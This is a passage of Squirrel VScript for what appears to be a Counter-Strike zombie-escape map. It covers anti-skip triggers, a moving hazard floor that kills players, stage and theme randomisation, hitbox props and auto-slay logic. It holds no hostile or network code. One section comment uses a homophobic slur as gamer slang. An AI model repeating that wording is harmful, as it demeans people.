						local skip_spos = Vector()+::MAPDATA[mapspawnindex].center_pos;
						local skip_name = "block_"+mapspawnindex.tostring()+"_antiskiptrigger";
						local skip_radius = (::SKIPSAFE+((manager.MAP_SIZE/2)*manager.GRID_SIZE));
						local skip_startend = [];
						skip_startend.push(Vector()+::MAPDATA[mapspawnindex].start_pos-(::MAPDATA[mapspawnindex].direction_current*::SKIPSAFE));
						skip_startend.push(Vector()+::MAPDATA[mapspawnindex].end_pos+(::MAPDATA[mapspawnindex].direction_next*::SKIPSAFE));
						::Ent(skip_spos,Vector(),"trigger_multiple",{
								spawnflags = 1,
								targetname = skip_name,
							},{
							skip_radius = skip_radius,
							skip_startend = skip_startend,
							function Touch(){
								local toucher = activator;	//__CSS__ activator may get reset, store toucher
								if(toucher==null||!toucher.IsValid())return;
								if(::SKIPSAFE_T_ONLY && toucher.GetTeam()==3)return;
								foreach(p in skip_startend){if(::GetDistance(toucher.GetOrigin(),p)<=::SKIPSAFE_RADIUS)return;}
								local pc = ::GetPlayerClass(toucher);
								if(pc==null){}else
								{
									foreach(uid in ::ITEMS.flight.eventlistener_userids)
									{
										if(uid == pc.userid)return;
									}
								}
								toucher.SetVelocity(Vector(0,0,-::SKIPSAFE_DOWNVEL));
							},function Run(){
								EntFireByHandle(self,"AddOutput","mins -"+skip_radius.tostring()+" -"+skip_radius.tostring()+" -1500",0.00,null,null);
								EntFireByHandle(self,"AddOutput","maxs "+skip_radius.tostring()+" "+skip_radius.tostring()+" 3000",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
								EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
								EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
								EntFireByHandle(self,"Enable","",0.02,null,null);
									//EntFireByHandle(self,"RunScriptCode",
									//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
									//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,50,30.00); ",0.05,null,null);
									//foreach(p in skip_startend){
									//DebugDrawBox(p,Vector(-5,-5,-5),Vector(5,5,5),255,255,0,200, 30.00);}
							}});
					}
					if(::SKIPSAFE_SIDES != null)
					{
						EntFire("block_"+(mapspawnindex-1).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
						local spos = Vector()+::MAPDATA[mapspawnindex].end_pos;
						local srot = ::DirToAngles(Vector()+::MAPDATA[mapspawnindex].direction_next);
						local dirleft = ::AnglesToDir(::DirToAngles(::MAPDATA[mapspawnindex].direction_next)+Vector(0,90,0));
						local skip_name = "block_"+mapspawnindex.tostring()+"_antiskiptrigger_sides";
						local sr = ::SKIPSAFE_SIDES_LENGTH.tostring();
						for(local i=0;i<2;i++)
						{
							local spawn_pos = Vector()+spos;
							if(i==0)spawn_pos += (dirleft*::SKIPSAFE_SIDES);
							else spawn_pos -= (dirleft*::SKIPSAFE_SIDES);
							::Ent(spawn_pos,srot,"trigger_multiple",{
									spawnflags = 1,
									targetname = skip_name,
								},{
								sr = sr,
								function Touch(){
									local toucher = activator;	//__CSS__ activator may get reset, store toucher
									if(toucher==null||!toucher.IsValid())return;
									if(::SKIPSAFE_T_ONLY && toucher.GetTeam()==3)return;
									local pc = ::GetPlayerClass(toucher);
									if(pc==null){}else
									{
										foreach(uid in ::ITEMS.flight.eventlistener_userids)
										{
											if(uid == pc.userid)return;
										}
									}
									toucher.SetVelocity(Vector(0,0,-::SKIPSAFE_DOWNVEL));
								},function Run(){
									EntFireByHandle(self,"AddOutput","mins 31 -2 -1500",0.00,null,null);
									EntFireByHandle(self,"AddOutput","maxs "+sr+" 2 3000",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"Enable","",0.02,null,null);
										//EntFireByHandle(self,"RunScriptCode",
										//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
										//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,150,30.00); ",0.05,null,null);
								}});
						}
					}
				//}catch(e){printl("[::SKIPSAFE SPAWN ERROR]: "+e);}		//__CSS__ threading_disabled
				if(!::DISABLE_HAZPLANE)
				{
							//testing:
						//::MAPDATA[mapspawnindex].hazplane_elev_bottom = 1;
						//::MAPDATA[mapspawnindex].hazplane_elev_top = 20;
						//::MAPDATA[mapspawnindex].hazplane_harsh = true;
						//::MAPDATA[mapspawnindex].hazplane_movespeed = (0.00+::HAZPLANE_DSPEED_F);		//F:fast, S:slow, commented_out:M:medium
					try{
					if(::MAPDATA[mapspawnindex].hazplane_elev_bottom != null && ::MAPDATA[mapspawnindex].hazplane_elev_top != null)
					{
						if(::MAPDATA[mapspawnindex].hazplane_elev_bottom > ::MAPDATA[mapspawnindex].hazplane_elev_top)
						{
							local hpeb_temp = ::MAPDATA[mapspawnindex].hazplane_elev_bottom;
							::MAPDATA[mapspawnindex].hazplane_elev_bottom = ::MAPDATA[mapspawnindex].hazplane_elev_top;
							::MAPDATA[mapspawnindex].hazplane_elev_top = hpeb_temp;
						}
						local hpvel = (0.00+::HAZPLANE_DSPEED_M);
						if(::MAPDATA[mapspawnindex].hazplane_movespeed!=null)hpvel = (0.00+::MAPDATA[mapspawnindex].hazplane_movespeed);
						local hp_spos = Vector()+::MAPDATA[mapspawnindex].center_pos;
						hp_spos.z = ((pos.z+(::manager.GetScriptScope().ELEVATION*::MAPDATA[mapspawnindex].hazplane_elev_bottom))-::HAZPLANE_LIP);
						local hp_mdist = Vector()+::MAPDATA[mapspawnindex].center_pos;
						hp_mdist.z = ((pos.z+(::manager.GetScriptScope().ELEVATION*::MAPDATA[mapspawnindex].hazplane_elev_top))-::HAZPLANE_LIP);
						hp_mdist = fabs(hp_spos.z-hp_mdist.z);
						local srot = [0,90,180,270];
						//::manager.PrecacheModel("models/luffaren/collective_hazfloor.mdl");
						::Ent(hp_spos,Vector(0,srot[RandomInt(0,srot.len()-1)],0),"prop_dynamic",{
								model = "models/luffaren/collective_hazfloor.mdl",
								skin = 0+::THEMES[::THEME].hazliquid_skin,
								rendermode = 3,
								targetname = "block_"+mapspawnindex.tostring()+"_hazplane",		//seems like it can be destroyed, but that's probably fine
							},{
							hp_mdist = hp_mdist,
							hpvel = hpvel,
							harsh = ::MAPDATA[mapspawnindex].hazplane_harsh,
							mapspawnindex = mapspawnindex,
							function Run(){
								local emodel = self.GetModelName();
								//::manager.PrecacheModel(emodel);
								////////::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{		//__CSS__ fake elevators not needed anylonger (?)
								////////		model = emodel,
								////////		rendermode = 9,
								////////		skin = 0+::THEMES[::THEME].hazliquid_skin,
								////////		targetname = self.GetName(),
								////////	},{
								////////	harsh = harsh,
								////////	master = self,
								////////	function Tick(){
								////////		if(master==null||!master.IsValid())
								////////		{
								////////			EntFireByHandle(self,"Kill","",0.00,null,null);
								////////			return;
								////////		}
								////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
								////////		self.SetOrigin(master.GetOrigin());
								////////		self.SetForwardVector(master.GetForwardVector());
								////////	},function Run(){
								////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
								////////		if(harsh)
								////////		{
								////////			::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.00,null);
								////////			::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.01,null);
								////////			::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.02,null);
								////////			EntFireByHandle(self,"AddOutput","glowenabled 1",0.00,null,null);
								////////			EntFireByHandle(self,"AddOutput","glowdist 10000",0.00,null,null);
								////////			EntFireByHandle(self,"AddOutput","glowstyle 0",0.00,null,null);
								////////			EntFireByHandle(self,"AddOutput","glowcolor 255 0 0",0.00,null,null);
								////////			local state = 0;
								////////			local ii = 0.15;
								////////			for(local i=0;i<31;i++)
								////////			{
								////////				EntFireByHandle(self,"AddOutput","glowenabled "+state.tostring(),ii,null,null);
								////////				state++;if(state>1)state=0;
								////////				ii += 0.15;
								////////				if(i<10&&(i%2)==0)
								////////					EntFireByHandle(self,"RunScriptCode","::Sound(\"*weapons/hegrenade/beep.wav\",Vector(),null,0,0.10,RandomInt(170,175),10);",ii,null,null);
								////////			}
								////////		}
								////////	}});
								EntFireByHandle(self,"AddOutput","rendermode 3",0.00,null,null);
								EntFireByHandle(self,"AddOutput","rendermode 3",1.00,null,null);
								////////EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null); //__CSS__ fake elevators not needed anylonger (?)
								////////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.00,null,null);
								////////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.50,null,null); 
								////////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",1.50,null,null);
								
								
								//__CSS__ re-implementation of the hazplane instakill warning (old above^):
								if(harsh)
								{
									::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.00,null);
									::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.01,null);
									::ServerSay("say WARNING: HARSH INSTAKILLING HAZPLANE",0.02,null);
									local state = 0;
									local ii = 0.15;
									for(local i=0;i<31;i++)
									{
										EntFireByHandle(self,"AddOutput","glowenabled "+state.tostring(),ii,null,null);
										state++;if(state>1)state=0;
										ii += 0.15;
										if(i<10&&(i%2)==0)
											EntFireByHandle(self,"RunScriptCode","::Sound(\"*weapons/hegrenade/beep.wav\",Vector(),null,0,0.10,RandomInt(170,175),10);",ii,null,null);
									}
									ii = 0.00;
									for(local i=0;i<20;i++)
									{
										ii += 0.50;
										EntFire("manager","RunScriptCode","ClientPrint(null,4,\"           *** WARNING ***\\nHARSH INSTAKILLING HAZPLANE\");",ii,null);
										
									}
								}
								
								
								::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
										targetname = "block_"+mapspawnindex.tostring()+"_hazplane",		//seems like it can be destroyed, but that's probably fine
										speed = hpvel,
										movedistance = hp_mdist,
										blockdamage = 99999,
										movedir = "-90 0 0",
										spawnflags = 8,
										rendermode = 1,
									},{
									prope = self,
									hp_mdist = hp_mdist,
									harsh = harsh,
									mapspawnindex = mapspawnindex,
									function Run(){
										EntFireByHandle(prope,"SetParent","!activator",0.00,self,null);
										EntFireByHandle(self,"AddOutput","OnFullyOpen !self:Close::"+(0.00+::HAZPLANE_TOGGLEWAIT).tostring()+":-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnFullyClosed !self:Open::"+(0.00+::HAZPLANE_TOGGLEWAIT).tostring()+":-1",0.00,null,null);
										if(hp_mdist>15)EntFireByHandle(self,"Open","",0.10,null,null);
										::Ent(self.GetOrigin(),Vector(),"trigger_multiple",{
												spawnflags = 1,
												targetname = "block_"+mapspawnindex.tostring()+"_hazplane",	//seems like it can be destroyed, but that's probably fine
											},{
											master = self,
											harsh = harsh,
											themehurtlogic = ""+::THEME,
											function Tick(){
												EntFireByHandle(self,"RunScriptCode"," Tick(); ",::LIQUID_TICKRATE,null,null);
												EntFireByHandle(self,"Disable","",0.00,null,null);
												EntFireByHandle(self,"Enable","",::LIQUID_ENABLE_DELAY,null,null);
											},function Touch(){
												local toucher = activator;	//__CSS__ activator may get reset, store toucher
												if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
												if(harsh)
												{
													if(toucher.GetTeam()==2)
													{
														toucher.SetOrigin(Vector(0,0,-16160));
														toucher.SetVelocity(Vector());
													}
													else if(toucher.GetTeam()==3)
													{
														
														
														//EntFireByHandle(toucher,"SetHealth","-1",0.00,null,null);		//__CSS__ falldownkillcred_css4    <og
																
																
																														//__CSS__ falldownkillcred_css4    new:
														if(!("falldowncp_attackers" in toucher.GetScriptScope()))toucher.GetScriptScope().falldowncp_attackers <- [];
														if(toucher.GetScriptScope().falldowncp_attackers.len()<=0)
															::HurtPlayer(toucher,true);
														else
														{
															if(toucher.GetScriptScope().falldowncp_attackers[0]==null||!toucher.GetScriptScope().falldowncp_attackers[0].IsValid())
																::HurtPlayer(toucher,true);
															else
																::HurtPlayer(toucher,999999,toucher.GetOrigin()+Vector(0,0,300),RandomInt(300,400),toucher.GetScriptScope().falldowncp_attackers[0],"falldown");
														}
														EntFireByHandle(toucher,"RunScriptCode","::HurtPlayer(self,true);",0.05,null,null);
														
														
														
														
													}
												}
												else
												{
													toucher.ValidateScriptScope();
													if("liquid_hurtcd" in toucher.GetScriptScope())return;
													toucher.GetScriptScope().liquid_hurtcd <- true;
													EntFireByHandle(toucher,"RunScriptCode"," if(\"liquid_hurtcd\" in this)delete liquid_hurtcd; ",::LIQUID_HURT_CD,null,null);
													local newhp = (toucher.GetHealth()-::THEMES[themehurtlogic].hazliquid_damage);
													::THEMES[themehurtlogic].HazliquidHurtLogic(toucher);
													if(newhp > 500)toucher.SetHealth(newhp);
													else EntFireByHandle(toucher,"SetHealth",newhp.tostring(),0.00,null,null);
												}
											},function Run(){
												EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
												EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
												EntFireByHandle(self,"AddOutput","mins -958 -958 -1",0.00,null,null);
												EntFireByHandle(self,"AddOutput","maxs 958 958 1",0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
												EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
												EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
												EntFireByHandle(self,"Enable","",0.05,null,null);
													//EntFireByHandle(self,"RunScriptCode",
													//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
													//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,10.00); ",0.05,null,null);
											}});
									}});
								}});
					}
					}catch(e){printl("[HAZPLANE SPAWN ERROR]: "+e);}
				}
				::SendCustomEvent("map_spawned",{map=this.map});
				::very_first_stage = false;
			}
		});
	::process_stage.push({queue=pqueue});
}catch(eee){
	printl("SpawnMap() GENERAL ERROR: "+eee);
	mapspawnindex = _spawnmapbackup_mapspawnindex;
	pos = _spawnmapbackup_pos;
	posdir = _spawnmapbackup_posdir;
	current_dir = _spawnmapbackup_current_dir;
	event_fail_chance_stack = _spawnmapbackup_event_fail_chance_stack;
	event_cooldown = _spawnmapbackup_event_cooldown;
	::ITEM_H_DESIRED = _spawnmapbackup_ITEM_H_DESIRED;
	::ITEM_Z_DESIRED = _spawnmapbackup_ITEM_Z_DESIRED;
	printl("SpawnMap() TRYING ANEW IN "+::SPAWNMAP_SUSPEND_RETRY+"s...");
	EntFireByHandle(self,"RunScriptCode"," SpawnMap(); ",::SPAWNMAP_SUSPEND_RETRY,null,null);
	if(::start_end_error)
	{
		printl("[END-USER-ERROR]: not using START_END tiles properly in pixel-map");
		::ServerSay("say [PIXEL-MAP-ERROR]: you are not using the START_END tiles properly (read up on them in the pixel-web-editor)",0.00,null);
	}
}
}
::process_stage <- [];
::process_stage_safebuffer <- [];
function TickStageProcess()				//new in v1_7 - prevents SQQuerySuspend
{
	EntFireByHandle(self,"RunScriptCode"," TickStageProcess(); ",::process_stage_tickrate,null,null);
	
	//newthread(_TickStageProcess.bindenv(this)).call();		//__CSS__ threading_disabled
	_TickStageProcess();
}
function _TickStageProcess()
{
	if(::process_stage.len()<=0)
	{
		if(::process_stage_safebuffer.len()<=0)return;
		for(local i=0;i<::process_stage_safebuffer.len();i++)
		{
			if("processed" in ::process_stage_safebuffer[i])
			{
				::process_stage_safebuffer.remove(i);
				i--;
			}
		}
		if(::process_stage_safebuffer.len()<=0)return;
		if(::process_stage_safebuffer.len()==1)
		{
			if("is_core" in ::process_stage_safebuffer[0])
			{
				//newthread(::process_stage_safebuffer[0].Run.bindenv(::process_stage_safebuffer[0])).call();		//new in v1_7 - prevents SQQuerySuspend			//__CSS__ threading_disabled <og
				::process_stage_safebuffer[0].Run();															//OLD												//__CSS__ threading_disabled
				
				::process_stage_safebuffer.clear();
				return;
			}
		}
		local pq = [];
		foreach(p in ::process_stage_safebuffer)
		{
			pq.push(p);
		}
		::process_stage.push({queue=pq});
		printl("TickStageProcess() - retrying "+pq.len()+" tilespawns...");
		::process_stage_safebuffer.clear();
	}
	for(local i=0;i<::process_stage_tickamount;i++)
	{
		if(::process_stage.len()<=0)return;
		local p = ::process_stage[0];
		if(p.queue.len()<=0)
		{
			::process_stage.remove(0);
			continue;
		}
		local pq = p.queue[0];
		p.queue.remove(0);
		::process_stage_safebuffer.push(pq);
		if("is_core" in pq)continue;
		if(::process_stacktrace)
		{
			//newthread(pq.Run.bindenv(pq)).call();		//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
			pq.Run();									//OLD
			pq.processed<-true;
			continue;
		}
		try{
			//newthread(pq.Run.bindenv(pq)).call();		//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
			pq.Run();									//OLD
			pq.processed<-true;
		}catch(e){printl("[TickStageProcess() ERROR]: "+e);}
	}
}
EntFireByHandle(::manager,"RunScriptCode"," TickStageProcess(); ",0.10,null,null);

::STAGES_TO_PLAY <- 4;	//how many stages to actually pick, should probably never be changed (and needs to be set up properly via the ::DIFFICULTIES table + adminroom buttons)
if(!("stage" in this) || ::stage==null)
{
	::stage <- 0;		//current stage-index integer (index 0 = stage 1), set to 'null' to reset map/generation, set to val above ::THEMES.len() to enable infinity
	::STAGES <- [];		//array of tables {stage-number,theme,ending}
	local stagebuf = [];
	local endingbuf = [];
	local stagebuf2 = [];
	for(local i=0;i<::STAGES_TO_PLAY;i++)
	{
		if(stagebuf.len()<=0){foreach(i,t in ::THEMES){stagebuf.push(i);}}
		local idx = RandomInt(0,stagebuf.len()-1);
		stagebuf2.push(stagebuf[idx]);
		stagebuf.remove(idx);
	}
	stagebuf = stagebuf2;
	local stageamount = 0+::LEVELAMOUNT_BASE;
	printl("-------------------------------------------------------------------------------");
	printl("	['::stage' not found - GENERATING RANDOM STAGE/THEME/ENDING ORDER]:");
	printl("	   [stage amount: "+::STAGES_TO_PLAY+"]     [theme amount: "+::THEMES_BASE.len()+"]     [ending amount: "+::ENDINGS.len()+"]");
	local sbl = 0+stagebuf.len();
	for(local i=0;i<sbl;i++)
	{
		local stagebuf_idx = RandomInt(0,stagebuf.len()-1);
		local stagebuf_pick = stagebuf[stagebuf_idx];
		stagebuf.remove(stagebuf_idx);
		if(endingbuf.len()<=0){foreach(k,v in ::ENDINGS){endingbuf.push(k);}}
		local endingbuf_idx = RandomInt(0,endingbuf.len()-1);
		local endingbuf_pick = endingbuf[endingbuf_idx];
		endingbuf.remove(endingbuf_idx);
		::STAGES.push({
				stage = (1+i),
				stage_goal = (0+stageamount),
				theme = stagebuf_pick,
				ending = ""+endingbuf_pick,
			});
		printl("stage "+(1+i)+"    -    (theme: "+stagebuf_pick+")    (levels: "+(0+stageamount)+")    (ending: "+endingbuf_pick+")");
		stageamount += ::LEVELAMOUNT_ADD;
		if(stageamount > ::LEVELAMOUNT_CAP)stageamount = (0+::LEVELAMOUNT_CAP);
	}
	printl("-------------------------------------------------------------------------------");
}
::SetNextLevelThemeEnding <- function(theme=null,ending=null)
{
	printl("-----------::SetNextLevelThemeEnding--------------------");
	printl("	theme: "+theme+"	ending: "+ending);
		printl("--------------------BEFORE------------------------------");
	for(local i=0;i<::STAGES.len();i++){printl("stage "+(1+i)+"    -    (theme: "+::STAGES[i].theme+")    (levels: "+(0+::STAGES[i].stage_goal)+")    (ending: "+::STAGES[i].ending+")");}
	local nextstage = (1+::stage);
	if(nextstage >= ::STAGES_TO_PLAY){printl("ABORTING	-	>= stage count");return;}
	local theme_found = null;
	local ending_found = null;
	for(local i=0;i<::STAGES.len();i++)
	{
		if(theme!=null)
		{
			if(theme == ::STAGES[i].theme)
				theme_found = (0+i);
		}
		if(ending!=null)
		{
			if(ending == ::STAGES[i].ending)
				ending_found = (0+i);
		}
	}
	if(theme_found != null)
	{
		if(theme_found <= ::stage)theme = null;
		else ::STAGES[theme_found].theme = ""+::STAGES[nextstage].theme;
	}
	if(ending_found != null)
	{
		if(ending_found <= ::stage)ending = null;
		else ::STAGES[ending_found].ending = ""+::STAGES[nextstage].ending;
	}
	if(theme!=null)::STAGES[nextstage].theme = ""+theme;
	if(ending!=null)::STAGES[nextstage].ending = ""+ending;
		printl("--------------------AFTER-------------------------------");
	for(local i=0;i<::STAGES.len();i++){printl("stage "+(1+i)+"    -    (theme: "+::STAGES[i].theme+")    (levels: "+(0+::STAGES[i].stage_goal)+")    (ending: "+::STAGES[i].ending+")");}
}
::Particle<-function(particle,pos,rot=Vector(),_parent=null,lifetime=0.10)
{
	::Ent(pos,rot,"info_particle_system",{
			effect_name = particle,
			start_active = 0,
			targetname = "particle",
		},{
		_parent=_parent,
		lifetime=lifetime,
		function Run(){
			if(_parent==null||!_parent.IsValid()){}else EntFireByHandle(self,"SetParent","!activator",0.00,_parent,null);
			EntFireByHandle(self,"Start","",0.00,null,null);
			EntFireByHandle(self,"Kill","",lifetime,null,null);
		}});
}
::HITBOX_ZERO_HP <- 500000;
::HITBOX_TICKRATE <- 0.10;
::HITBOX_MODEL <- "models/props_junk/watermelon01.mdl";		//must be an ingame model that can be broken by bullets
::HITBOX_MODEL2 <- "models/lutils/healthprop.mdl";			//must be this model, to support OBB sizing
::Hitbox <- function(pos,rot,health,mins,maxs,damagefilter,debugdraw,logic,hname="hitbox")
{
	if(!("HITBOX_MODELCACHEH" in this))::HITBOX_MODELCACHEH<-null;
	if(::HITBOX_MODELCACHEH==null||!::HITBOX_MODELCACHEH.IsValid())::HITBOX_MODELCACHEH<-Entities.CreateByClassname("logic_relay");
	::HITBOX_MODELCACHEH.PrecacheModel(::HITBOX_MODEL);
	return ::Ent(pos,rot,"prop_physics",{
			model = ""+::HITBOX_MODEL,
			spawnflags = 12,		//motion disabled + debris
			//spawnflags = 4108,	//motion disabled + debris + debris with trigger interaction	//__CSS__ (TraceLine-hits + trigger? may be useful)
			//damagefilter = damagefilter,
			rendermode = 1,
			renderamt = 0,
			health = 0+::HITBOX_ZERO_HP+health,
			targetname = ""+hname,
		},{
		debugdraw = debugdraw,
		health = health,
		lasthealth = 1000000,
		isbroken = false,
		mins = mins,
		maxs = maxs,
		logic = logic,
		initialized = false,
		function Hurt(){
			if(!this.initialized)
			{
				self.SetHealth(0+::HITBOX_ZERO_HP+this.health);
				return;
			}
			if(self.GetHealth()<=::HITBOX_ZERO_HP && !this.isbroken)
			{
				this.isbroken = true;
				this.logic.Act(3,activator);
			}
			else
			{
				if(self.GetHealth()>this.lasthealth)
					this.logic.Act(4,activator);
				else
					this.logic.Act(2,activator);
			}
			this.lasthealth = self.GetHealth();
		},
		function Tick(){
			if(this.isbroken)
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return;
			}
			EntFireByHandle(self,"RunScriptCode"," Tick(); ",::HITBOX_TICKRATE,null,null);
			if(this.debugdraw)DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),
				self.GetAbsAngles(),Vector(255,50,0),20,0.05+::HITBOX_TICKRATE)
		},function Run(){
			EntFireByHandle(self,"AddOutput","OnHealthChanged !self:RunScriptCode:Hurt();:0:-1",0.00,null,null);
			EntFireByHandle(self,"RunScriptCode"," this.initialized = true; ",0.04,null,null);
			EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.05,null,null);
			self.PrecacheModel(::HITBOX_MODEL2);
			self.SetModel(::HITBOX_MODEL2);
			self.SetHealth(0+::HITBOX_ZERO_HP+this.health);
			this.lasthealth = (0+::HITBOX_ZERO_HP+this.health);
			self.SetSolid(3);
			self.SetSize(this.mins,this.maxs);
			this.logic.hitboxhandle <- self;
			this.logic.self <- self;
			this.logic.Act(1,null);
		}});
}
::DirectionDifference <- function(start,target,dir)
{
	local target_dir = (target - start);
	target_dir.Norm();
	local ang = dir.Dot(target_dir);
	ang *= 90;
	ang += 90;
	return (180.00 - ang);
}
::EyeTrace_NAMEINDEX <- 0;
::EyeTrace <- function(player,logic)
{
	if(player==null||!player.IsValid())return;
	
	
	
	//__CSS__ eye-functions are now in the game, hail gaben!
	local rot = player.EyeAngles()
	local dir = ::AnglesToDir(rot);
	logic.Run(player,dir,rot);
	return;					//OG stuff below, simply abort from here
	
	
	
	::EyeTrace_NAMEINDEX++;if(::EyeTrace_NAMEINDEX>300)::EyeTrace_NAMEINDEX=1;
	local eyetrace_index = 0+::EyeTrace_NAMEINDEX;
	::Ent(Vector(),Vector(),"info_particle_system",{
			targetname = "eyetrace_"+eyetrace_index.tostring(),
		},{
		player = player,
		logic = logic,
		eyetrace_index = eyetrace_index,
		function Run(){
			if(player==null||!player.IsValid())
			{
				EntFireByHandle(self,"Kill","",0.00,null,null);
				return;
			}
			local playername = player.GetName();
			local playernametemp = "eyetraceplayer_"+eyetrace_index.tostring();
			player.__KeyValueFromString("targetname",playernametemp);
			::Ent(Vector(),Vector(),"logic_measure_movement",{
					targetname = "eyetrace_measure",
					MeasureReference = playernametemp,
					MeasureTarget = playernametemp,
					MeasureType = 1,
					Target = "eyetrace_"+eyetrace_index.tostring(),
					TargetReference = playernametemp,
				},{
				player = player,
				playername = playername,
				logic = logic,
				ment = self,
				tries = 10,
				function PostRun(){
					if(ment.GetForwardVector().tostring()=="(vector : (1.000000, 0.000000, 0.000000))")
					{
						tries--;
						if(tries>0)
						{
							EntFireByHandle(self,"RunScriptCode"," PostRun(); ",0.01,null,null);
							return;
						}
						//else printl("[::EyeTrace ERROR]: max tries exceeded - failed for player "+player+" (still running logic)");
					}
					EntFireByHandle(self,"Kill","",0.00,null,null);
					EntFireByHandle(ment,"Kill","",0.00,null,null);
					local dir = ment.GetForwardVector();
					local rot = ment.GetAngles();
					logic.Run(player,dir,rot);
				},function Run(){
					EntFireByHandle(self,"RunScriptCode"," PostRun(); ",0.01,null,null);
					player.__KeyValueFromString("targetname",playername);
				}});
		}});
}


//__CSS__ css4_auto_finale_slay
finale_elevator_autoslay_enable <- false;			//set to 'false' to not autoslay on the finale elevator
finale_elevator_autoslay_enable_count <- 30;		//don't autoslay if there's less then X players on the server
finale_elevator_autoslay_count <- 10;				//autoslay if there's <= humans alive when the first finale elevator leaves (round is lost, don't delay)
function FinaleElevatorAutoslay()					//this runs a handful of times between 0.00 - 40.00s after the first finale elevator leaves
{
	if(!finale_elevator_autoslay_enable)return;
	if(::GetPlayerCount() >= finale_elevator_autoslay_enable_count)
	{
		local alive_cts = [];
		for(local h;h=Entities.FindByClassname(h,"player");){
			if(h==null || !h.IsValid() || !h.IsAlive() || h.GetTeam()!=3)continue;
			alive_cts.push(h);
		}
		if(alive_cts.len() <= finale_elevator_autoslay_count)
		{
			::teamwin = false;
			foreach(h in alive_cts)
				::HurtPlayer(h,true);
			::ServerSay("say "+::finalecpf+" you lost too many humans - slaying to save time",0.00,null);
			::ServerSay("say "+::finalecpf+" you lost too many humans - slaying to save time",0.01,null);
			::ServerSay("say "+::finalecpf+" you lost too many humans - slaying to save time",0.02,null);
			::ServerSay("say "+::finalecpf+" you lost too many humans - slaying to save time",0.03,null);
			::ServerSay("say "+::finalecpf+" you lost too many humans - slaying to save time",0.04,null);
		}
	}
}



//__CSS__ css4_no_solofagging
::teamwin <- true;
teamwin_enable_count <- 20;
teamwin_min_count <- 5;
::teamwin_timings <- [0.00,0.50,1.00,1.50,2.00,2.50,3.00,3.50,4.00,4.50,5.00];
function TeamWin()
{
	if(::round_ended || !::teamwin)return;
		//EntFire("manager","RunScriptCode","TeamWin();",0.50,null);
	if(::GetPlayerCount() >= teamwin_enable_count)
	{
		local alive_cts = [];
		for(local h;h=Entities.FindByClassname(h,"player");){
			if(h==null || !h.IsValid() || !h.IsAlive() || h.GetTeam()!=3)continue;
			alive_cts.push(h);
		}
		if(alive_cts.len() <= teamwin_min_count)
		{
			::teamwin = false;
			foreach(h in alive_cts)
				::HurtPlayer(h,true);
			local cols = [
				"\x07FFBFBF",
				"\x07FF9F9F",
				"\x07FF7979",
				"\x07FF4C4C",
				"\x07FF3131",
				"\x07FF1717",
				"\x07F10000",
				"\x07D60000",
				"\x07C60000",
				"\x07B90000",
				"\x07A10000",
				"\x078A0000",
				"\x07750000",
				"\x07630000",
				"\x07460000",
				"\x07300000",
			];
			local ii = 0.00;
			local ir = 0.05;
			for(local i=0;i<cols.len()-1;i++){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
			for(local i=cols.len()-1;i>0;i--){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
			for(local i=0;i<cols.len()-1;i++){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
			for(local i=cols.len()-1;i>0;i--){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
			for(local i=0;i<cols.len()-1;i++){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
			for(local i=cols.len()-1;i>0;i--){ii+=ir;::ServerSay("say "+cols[i]+"You've abandoned your team, try again        [FAILED]",ii,null);}
		}
	}
}
function SlaySolo()
{
	if(::round_ended || !::teamwin)return;
	if(::GetPlayerCount() >= teamwin_enable_count)
	{
		local alive_cts = [];
